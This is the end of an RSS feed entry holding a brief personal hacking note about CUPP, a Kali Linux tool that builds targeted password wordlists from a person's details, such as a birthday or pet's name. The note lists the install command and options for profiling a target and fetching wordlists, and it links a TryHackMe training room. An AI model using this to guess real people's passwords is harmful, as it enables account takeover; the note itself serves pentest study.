			<description>&lt;p&gt;The &lt;strong&gt;Common User Passwords Profiler&lt;/strong&gt; (&lt;code&gt;sudo apt install cupp&lt;/code&gt; on Kali Linux) can generate potential password lists based on personal data (birthday, petâs name, etc.). It can be run in an automated fashion, or will ask you appropriate questions for a specific target when invoked as &lt;code&gt;cupp -I&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Using &lt;code&gt;cupp -l&lt;/code&gt; will also download pre-created lists in a variety of languages.&lt;/p&gt;&lt;p&gt;Using &lt;code&gt;cupp -a&lt;/code&gt; will download lists of known default passwords.&lt;/p&gt;&lt;h2 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Mon, 22 May 2023 05:18:22 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20CUPP.md</guid>
		</item>
	</channel>
</rss>
